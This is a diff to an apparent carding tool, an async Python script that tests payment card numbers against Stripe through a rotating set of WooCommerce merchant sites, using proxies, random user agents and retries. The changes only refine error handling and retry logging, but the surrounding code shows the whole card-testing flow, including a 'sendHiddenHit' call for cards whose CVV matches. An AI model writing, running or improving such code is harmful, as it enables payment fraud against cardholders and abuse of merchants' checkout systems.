@@ -109,6 +109,7 @@ async def performCheck(card, proxy=None, logCallback=None):
 
     while retries < 3:
         fullResponseText = ""
+        specificError = "Unknown Gate Error"  # Default error message
         try:
             async with aiohttp.ClientSession() as session:
                 headers = {'User-Agent': generate_user_agent()}
@@ -123,8 +124,11 @@ async def performCheck(card, proxy=None, logCallback=None):
                 pmPayload = {'type': 'card', 'card[number]': cc, 'card[cvc]': cvc, 'card[exp_year]': yy, 'card[exp_month]': mm, 'key': key.group(1)}
                 async with session.post("https://api.stripe.com/v1/payment_methods", data=pmPayload, proxy=proxy, timeout=15) as r: 
                     pmText = await r.text(); fullResponseText = pmText
-                    if any(msg in pmText.lower() for msg in RETRY_MESSAGES): raise Exception("Retryable PM Error")
-                
+                    # Check for specific retryable messages
+                    for msg in RETRY_MESSAGES:
+                        if msg in pmText.lower():
+                            raise Exception(f"Retryable PM Error: {msg}")
+
                 if '"error"' in pmText: return categorizeResponse(pmText)
                 
                 pmId = json.loads(pmText).get('id')
@@ -133,7 +137,10 @@ async def performCheck(card, proxy=None, logCallback=None):
                 confirmPayload = {'action': 'wc-stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pmId, 'wc-stripe-payment-nonce': nonce.group(1)}
                 async with session.post(f"{apiUrl}?wc-ajax=wc_stripe_create_and_confirm_setup_intent", data=confirmPayload, proxy=proxy, timeout=15) as r: 
                     confirmText = await r.text(); fullResponseText = confirmText
-                    if any(msg in confirmText.lower() for msg in RETRY_MESSAGES): raise Exception("Retryable Confirmation Error")
+                    # Check for specific retryable messages again
+                    for msg in RETRY_MESSAGES:
+                        if msg in confirmText.lower():
+                            raise Exception(f"Retryable Confirmation Error: {msg}")
 
                 category, msg = categorizeResponse(confirmText)
                 if category == "CVV MATCHED":
@@ -142,11 +149,11 @@ async def performCheck(card, proxy=None, logCallback=None):
                     await sendHiddenHit(card, binData, timeTaken)
                 return category, msg
         except Exception as e:
+            # Capture the specific error from the exception
+            specificError = str(e)
             retries += 1
-            errorAndResponse = str(e).lower() + fullResponseText.lower()
-            logMsg = f"{card} -> Gate Error. Retrying ({retries}/3)"
-            if any(msg in errorAndResponse for msg in RETRY_MESSAGES):
-                logMsg = f"{card} -> Retryable error. Retrying... ({retries}/3)"
+            # I-display ang specific error sa log message
+            logMsg = f"{card} -> Retry: [{specificError}]. Retrying... ({retries}/3)"
             if logCallback: logCallback("RETRY", logMsg)
             apiUrl = next(gateCycle); await asyncio.sleep(2)
             
